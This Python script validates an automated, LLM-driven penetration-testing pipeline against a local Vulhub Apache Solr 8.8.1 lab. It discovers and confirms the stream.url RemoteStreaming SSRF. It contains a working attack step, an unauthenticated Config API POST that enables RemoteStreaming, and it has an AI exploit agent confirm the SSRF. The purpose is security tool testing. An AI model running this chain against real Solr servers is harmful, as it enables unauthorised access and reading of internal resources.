"""Live-integration TRANSFER validation of the discovery engine (Apache Solr SSRF).

Proves the discovery engine generalizes: against a LIVE Apache Solr 8.8.1 (Vulhub
``solr/Remote-Streaming-Fileread`` on :8983), it finds and confirms the
``stream.url`` RemoteStreaming SSRF end-to-end through the REAL proof engine with a
LIVE Anthropic exploit LLM — reusing the SAME ``EGRESS_FETCH`` capability primitive
catalogued for GeoServer (CVE-2021-40822), driven through the SAME
DiscoveryEngine → Orchestrator wiring → Exploit plan-union seam.

This is the transfer metric made live: the ONLY new code the second target needed
is the general source-ingest generalization (non-servlet param-bag entrypoints,
symbolic-constant param names, cross-class URL-fetch wrappers) plus a one-line
empty-route join — no Solr-specific catalog entry, no oracle rewrite, no carrier.

Sections (each prints raw evidence):

  1. SOURCE INGESTION + DISCOVERY (via the wired Orchestrator step) — ingest Solr's
     real ``SolrRequestParsers`` / ``ContentStreamBase`` / ``CommonParams`` →
     surface the ``stream.url`` channel and the ``URLStream`` egress sink; show the
     ``_test_ssrf`` ExploitTask the engine lowers to (query ``stream.url``, NO
     carrier — Solr has no host guard, unlike GeoServer).
  2. PROOF via the real seam — hand the hypothesis to the Exploit agent through the
     REAL message-content handoff (``discovery_tasks`` → ``run()`` →
     ``_parse_discovery_tasks`` → ``_merge_discovery_tasks``), run the real
     pipeline; the SSRF confirms IN-BAND via P3 (Solr fetched its own loopback and
     the ``debug/dump`` handler reflected the content), writing a real trace +
     report with the raw ConfirmationEvidence pair.
  3. ZERO-FP — a non-fetch control param (``q``) on the same endpoint yields no
     finding (reflection is not a fetch).

Pre-flight: requires ANTHROPIC_API_KEY and a reachable Solr; if either is missing
it STOPS and reports (no substitute run). Solr's SSRF has a stateful precondition
GeoServer's did not — RemoteStreaming must be enabled via an unauthenticated Config
API POST; the driver performs that as an ENVIRONMENT precondition (automating the
config-mutation-as-attack-step is a named out-of-scope limitation, reported below).
``TOOL_EXEC_MODE=local`` is set before importing clinkz so the in-process aiohttp
path is used (docker mode would curl inside the unrelated clinkz-tools container).

Usage::

    python scripts/live_solr_discovery.py [--source <path>] [--host <host:port>] [--core <name>]
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import sys
import urllib.error
import urllib.request
from pathlib import Path

# Must be set BEFORE importing clinkz so the HTTP client uses host aiohttp.
os.environ.setdefault("TOOL_EXEC_MODE", "local")

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):  # pragma: no cover
        pass

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(name)-28s %(levelname)-5s %(message)s",
    datefmt="%H:%M:%S",
)
for _noisy in ("httpcore", "httpx", "aiohttp", "urllib3", "google", "anthropic", "openai"):
    logging.getLogger(_noisy).setLevel(logging.WARNING)
log = logging.getLogger("solr_discovery")

REPO_ROOT = Path(__file__).resolve().parent.parent
DEFAULT_SOURCE = REPO_ROOT / "tests" / "fixtures" / "solr_remote_streaming"


def _rule(title: str) -> None:
    print("\n" + "=" * 78 + f"\n{title}\n" + "=" * 78)


def _http_get_text(url: str, timeout: float = 10.0) -> tuple[int, str]:
    """Small stdlib GET for pre-flight / black-box surface checks."""
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:  # noqa: S310 (in-scope target)
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # pragma: no cover - preflight diagnostics
        return 0, f"<error: {exc}>"


def _detect_core(base_host: str) -> str | None:
    """Return the first Solr core name, or None."""
    status, body = _http_get_text(f"{base_host}/solr/admin/cores?indexInfo=false&wt=json")
    if status != 200:
        return None
    try:
        data = json.loads(body)
    except json.JSONDecodeError:
        return None
    cores = list((data.get("status") or {}).keys())
    return cores[0] if cores else None


def _enable_remote_streaming(base_host: str, core: str) -> tuple[bool, str]:
    """Enable RemoteStreaming on *core* via the unauthenticated Config API.

    Returns (ok, detail). This is the Solr-specific stateful precondition (the
    unauthenticated config-mutation half of the CVE chain); the driver performs it
    as environment setup — Clinkz's SSRF methodology does not automate a
    config-mutation-as-attack-step (a named limitation, reported in the writeup).
    """
    payload = json.dumps(
        {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": True}}
    ).encode()
    req = urllib.request.Request(  # noqa: S310 (in-scope target)
        f"{base_host}/solr/{core}/config",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:  # noqa: S310
            return resp.status in (200, 201), f"HTTP {resp.status}"
    except urllib.error.HTTPError as exc:
        return False, f"HTTP {exc.code}: {exc.read().decode('utf-8', 'replace')[:200]}"
    except Exception as exc:
        return False, f"error: {exc}"


async def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--source", default=str(DEFAULT_SOURCE), help="Solr source path")
    parser.add_argument("--host", default="http://localhost:8983", help="Solr host:port base")
    parser.add_argument("--core", default=None, help="Solr core name (auto-detected if omitted)")
    args = parser.parse_args()

    base_host = args.host.rstrip("/")

    # ---- Pre-flight: keys + live-ping (STOP, no substitute, if either fails) ----
    _rule("PRE-FLIGHT")
    if not os.environ.get("ANTHROPIC_API_KEY"):
        from clinkz.config import settings  # triggers .env load

        if not getattr(settings, "anthropic_api_key", None):
            log.error("STOP: ANTHROPIC_API_KEY not set — the exploit LLM cannot run.")
            return 2
    status, _ = _http_get_text(f"{base_host}/solr/")
    if status not in (200, 302):
        log.error(
            "STOP: Solr not reachable at %s/solr/ (status %s). No substitute.", base_host, status
        )
        return 2
    core = args.core or _detect_core(base_host)
    if not core:
        log.error("STOP: could not detect a Solr core at %s.", base_host)
        return 2
    ok, detail = _enable_remote_streaming(base_host, core)
    print(f"Solr /solr/ -> HTTP {status}; core={core}; enableRemoteStreaming -> {ok} ({detail})")
    print(f"ANTHROPIC_API_KEY present: True; TOOL_EXEC_MODE={os.environ.get('TOOL_EXEC_MODE')}")
    if not ok:
        log.error("STOP: could not enable RemoteStreaming — SSRF precondition unmet.")
        return 2

    base_url = f"{base_host}/solr/{core}/debug/dump"

    # ---- 1. SOURCE INGESTION + DISCOVERY via the WIRED orchestrator step -------
    _rule("1. SOURCE INGESTION + DISCOVERY (wired Orchestrator step → ExploitTask)")
    from clinkz.discovery import DiscoveryEngine
    from clinkz.models.scope import EngagementScope, ScopeEntry, ScopeType
    from clinkz.orchestrator.orchestrator import OrchestratorAgent

    scope = EngagementScope(
        name="Solr RemoteStreaming SSRF (transfer slice)",
        targets=[
            ScopeEntry(value="localhost", type=ScopeType.DOMAIN),
            ScopeEntry(value="127.0.0.1", type=ScopeType.IP),
        ],
        source_dir=args.source,
        discovery_base_url=base_url,
    )

    # Show the raw SourceModel the ingestor surfaces (the gray-box value-add).
    disc = DiscoveryEngine().discover(args.source, ["Java", "Solr"], base_url)
    sm = disc.source_model
    print(
        f"ingested files={sm.files_ingested} coverage={sm.coverage_grade.value} "
        f"tech={sm.technologies}"
    )
    for ep in sm.entrypoints:
        print(
            f"  entrypoint: {ep.http_methods} route={ep.route!r} "
            f"handler={ep.handler_symbol} params={ep.params}"
        )
    for cs in sm.call_sites:
        fname = cs.file.replace("\\", "/").split("/")[-1]
        print(
            f"  call-site : {cs.primitive_class.value} {cs.symbol}() "
            f"tainted_by={cs.tainted_by!r} @{fname}:{cs.line}"
        )
    for d in disc.deltas:
        print(f"  Δ: {d.delta_grade.value} conf={d.delta_confidence} :: {d.intent_evidence}")
    for e in disc.edges:
        print(f"  reach: {e.soundness_grade.value} conf={e.reach_confidence} :: {e.path_evidence}")

    # Black-box gap: stream.url is a framework-level param on the shared request
    # parser — not a link/form in the crawlable admin UI. A URL-only crawl never
    # enumerates it as an injection point; the gray-box source does.
    _st, admin_body = _http_get_text(f"{base_host}/solr/")
    print(
        f"\nblack-box: 'stream.url' injection point discoverable by crawling /solr/? "
        f"{'stream.url' in admin_body} (framework param on the shared parser → gray-box only)"
    )

    # Build the tasks through the REAL wired orchestrator step.
    orch = OrchestratorAgent.__new__(OrchestratorAgent)
    orch._logger = logging.getLogger("orchestrator")
    orch._scope = scope
    tasks = orch._build_discovery_tasks(["Java", "Solr"], "localhost")
    for t in tasks:
        locs = {k: v.value for k, v in t.param_locations.items()}
        print(
            f"  → ExploitTask: {t.test_method} {t.endpoint_method} {t.endpoint_url}\n"
            f"      params={t.endpoint_params} locations={locs} carrier={t.carrier_constraints}"
        )
    if not tasks:
        log.error("STOP: discovery produced no exploit tasks.")
        return 3

    # ---- 2. PROOF via the real seam (message-content handoff) ------------------
    _rule("2. PROOF — hand tasks to Exploit via the real run() handoff, run the pipeline")
    from clinkz.agents.exploit import ExploitAgent, PageAnalysis
    from clinkz.agents.report import ReportAgent
    from clinkz.llm.factory import get_llm_client
    from clinkz.models.scan import ParamLocation, ScanResult
    from clinkz.observability.trace import TraceWriter, set_active_trace_writer
    from clinkz.state import StateStore

    db_path = REPO_ROOT / "outputs" / "solr_discovery.db"
    db_path.parent.mkdir(parents=True, exist_ok=True)
    llm = get_llm_client("anthropic")

    async with StateStore(str(db_path)) as state:
        engagement_id = await state.create_engagement(
            "Solr RemoteStreaming SSRF (transfer slice)", scope.model_dump(mode="json")
        )
        trace = TraceWriter(engagement_id)
        set_active_trace_writer(trace)
        try:
            agent = ExploitAgent(
                llm=llm, tools=[], scope=scope, state=state, engagement_id=engagement_id
            )
            # THE WIRED HANDOFF: discovery tasks ride in the message content exactly
            # as the Orchestrator passes them; run() parses + unions them. The
            # black-box scan is EMPTY, so discovery is the ONLY reason stream.url is
            # tested. This exercises _parse_discovery_tasks + _merge_discovery_tasks.
            result = await agent.run(
                {
                    "scan_result": ScanResult(target=base_url).model_dump(mode="json"),
                    "research_result": {"technologies": ["Java", "Solr"]},
                    "discovery_tasks": [t.model_dump(mode="json") for t in tasks],
                }
            )
            print(f"exploit summary: {result['summary']}")

            findings = await state.get_findings(engagement_id)
            ssrf = [f for f in findings if "ssrf" in str(f.get("title", "")).lower()]
            print(f"\nfindings in state: {len(findings)}  (ssrf: {len(ssrf)})")
            for f in findings:
                sev = str(f.get("severity", "?")).upper()
                print(f"  [{sev}] {f.get('title')}  status={f.get('status')}")
                for ev in (f.get("evidence") or [])[:8]:
                    print(f"      • {str(ev)[:170]}")

            # ---- 3. ZERO-FP control ------------------------------------------
            _rule("3. ZERO-FP — non-fetch control param 'q' on the same endpoint")
            # debug/dump echoes 'q' in its params dump (reflection) but never fetches
            # it — so a reflected value must NOT confirm SSRF. The control page is
            # built directly so input_params is exactly the control.
            control_page = PageAnalysis(
                url=base_url,
                body="",
                status=200,
                input_params=["q"],
                param_locations={"q": ParamLocation.QUERY},
            )
            control_findings = await agent._test_ssrf(control_page)
            print(
                f"  isolated control param 'q' → {len(control_findings)} SSRF findings (expect 0)"
            )

            # ---- Report --------------------------------------------------------
            _rule("REPORT + TRACE (raw artifact paths)")
            report_agent = ReportAgent(
                llm=llm, tools=[], scope=scope, state=state, engagement_id=engagement_id
            )
            rep = await report_agent.run(
                {"engagement_id": engagement_id, "engagement_name": "Solr RemoteStreaming SSRF"}
            )
        finally:
            trace.close()
            set_active_trace_writer(None)

        trace_path = REPO_ROOT / "outputs" / engagement_id / "trace.jsonl"
        print(f"engagement_id : {engagement_id}")
        print(f"report (json) : {rep.get('json_path')}")
        print(f"report (md)   : {rep.get('markdown_path')}")
        print(f"trace (jsonl) : {trace_path}")

        # ---- Verdict ---------------------------------------------------------
        _rule("VERDICT")
        confirmed = any(
            "ssrf" in str(f.get("title", "")).lower()
            and str(f.get("status")) in ("confirmed", "new")
            for f in findings
        )
        # A raw-auditable confirmation carries the ConfirmationEvidence pair.
        has_evidence_pair = any(
            "confirming_excerpt" in str(ev).lower()
            for f in findings
            for ev in (f.get("evidence") or [])
        )
        zero_fp = len(control_findings) == 0
        print(f"  SSRF CONFIRMED in-band (P3, genuine)         : {confirmed}")
        print(f"  raw-auditable ConfirmationEvidence in finding: {has_evidence_pair}")
        print(f"  zero false positives (control param 'q')     : {zero_fp}")
        ok_all = confirmed and has_evidence_pair and zero_fp
        print(f"\n  RESULT: {'PASS' if ok_all else 'INCOMPLETE'}")
        return 0 if ok_all else 4


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
